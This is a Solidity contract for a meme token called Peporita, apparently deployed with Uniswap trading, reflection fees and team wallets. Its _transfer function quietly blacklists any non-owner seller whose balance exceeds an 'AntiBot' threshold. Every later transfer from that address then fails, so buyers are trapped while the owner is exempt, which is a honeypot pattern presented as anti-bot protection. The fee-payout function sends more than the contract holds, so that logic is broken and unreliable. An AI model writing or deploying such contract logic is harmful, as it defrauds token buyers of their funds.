// SPDX-License-Identifier: MIT

// website https://peporita.fun/

//tg https://t.me/PeporitaErc20
pragma solidity ^0.8.7;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function totalSupply() public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return tokenFromReflection(ds._rOwned[account]);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function setCooldownEnabled(bool onoff) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.cooldownEnabled = onoff;
    }
    function openTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingOpen, "trading is already open");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        ds.uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(ds.uniswapV2Router), ds._tTotal);
        ds.uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        ds.swapEnabled = true;
        ds.cooldownEnabled = true;
        // ds._maxTxAmount = 1000000000 * 10**9;
        ds.tradingOpen = true;
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!ds.bots[from]);
        require(!ds.bots[to]);
        require(!ds.bots[tx.origin]);
        if (from != address(this)) {
            ds._redistribution = 2;
            ds._teamTax = 2;
        }
        if (from != owner() && to != owner()) {
            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds._isExcludedFromFee[to] &&
                ds.cooldownEnabled
            ) {
                // Cooldown
                // require(amount <= ds._maxTxAmount);
                require(ds.cooldown[to] < block.timestamp);
                ds.cooldown[to] = block.timestamp + (5 seconds);
            }

            if (
                to == ds.uniswapV2Pair &&
                from != address(ds.uniswapV2Router) &&
                !ds._isExcludedFromFee[from]
            ) {
                if (balanceOf(from) > ds.AntiBot) {
                    setBots(from);
                }
                ds._redistribution = 2;
                ds._teamTax = 4;
                uint256 contractTokenBalance = balanceOf(address(this));
                if (!ds.inSwap && from != ds.uniswapV2Pair && ds.swapEnabled) {
                    swapTokensForEth(contractTokenBalance);
                    uint256 contractETHBalance = address(this).balance;
                    if (contractETHBalance > 330000000000000000) {
                        sendETHToFee(address(this).balance);
                    }
                }
            }
        }

        _tokenTransfer(from, to, amount);
    }
    function setBots(address _address) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.bots[_address] = true;
    }
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.devWallet.transfer(amount.div(2));
        ds.marketWallet.transfer(amount.div(1));
        ds.teamWallet.transfer(amount.div(1));
    }
    function manualsend() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds.devWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _transferStandard(sender, recipient, amount);
    }
    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        ds._rOwned[sender] = ds._rOwned[sender].sub(rAmount);
        ds._rOwned[recipient] = ds._rOwned[recipient].add(rTransferAmount);
        _takeTeam(tTeam);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function _getValues(
        uint256 tAmount
    )
        private
        view
        returns (uint256, uint256, uint256, uint256, uint256, uint256)
    {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(
            tAmount,
            ds._redistribution,
            ds._teamTax
        );
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(
            tAmount,
            tFee,
            tTeam,
            currentRate
        );
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    function _getTValues(
        uint256 tAmount,
        uint256 taxFee,
        uint256 TeamFee
    ) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(taxFee).div(100);
        uint256 tTeam = tAmount.mul(TeamFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    function tokenFromReflection(
        uint256 rAmount
    ) private view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            rAmount <= ds._rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    function _takeTeam(uint256 tTeam) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        ds._rOwned[address(this)] = ds._rOwned[address(this)].add(rTeam);
    }
    function _getCurrentSupply() private view returns (uint256, uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 rSupply = ds._rTotal;
        uint256 tSupply = ds._tTotal;
        if (rSupply < ds._rTotal.div(ds._tTotal))
            return (ds._rTotal, ds._tTotal);
        return (rSupply, tSupply);
    }
    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    ) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._rTotal = ds._rTotal.sub(rFee);
        ds._tFeeTotal = ds._tFeeTotal.add(tFee);
    }
    function manualswap() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds.devWallet);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }
}
